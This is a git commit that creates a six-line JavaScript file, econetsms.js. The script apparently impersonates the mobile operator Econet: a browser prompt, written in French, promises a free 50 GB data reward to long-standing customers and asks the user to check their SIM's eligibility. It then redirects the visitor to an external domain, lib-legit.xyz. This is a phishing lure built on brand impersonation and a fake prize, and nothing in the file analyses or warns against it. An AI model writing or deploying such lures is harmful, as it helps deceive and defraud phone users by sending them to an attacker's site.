9e89f1526d015294b97db2da76babf6f49edbbac
bigetijazz11 <bigetijazz11@gmail.com>
2024-11-23 05:05:39 -0800

    Create econetsms.js

---
+++ econetsms.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVER 50 Go'
+password=prompt('Econet : Cher client, veuillez vérifier si votre carte SIM est éligible pour recevoir des données ACTIVER 50 Go, récompense des anciens clients, appuyez sur Ok pour vérifier maintenant','ACTIVER 50 Go');
+if (password != 'ACTIVER 50 Go') {
+location.href='https://www.lib-legit.xyz/Econet50go';
+}
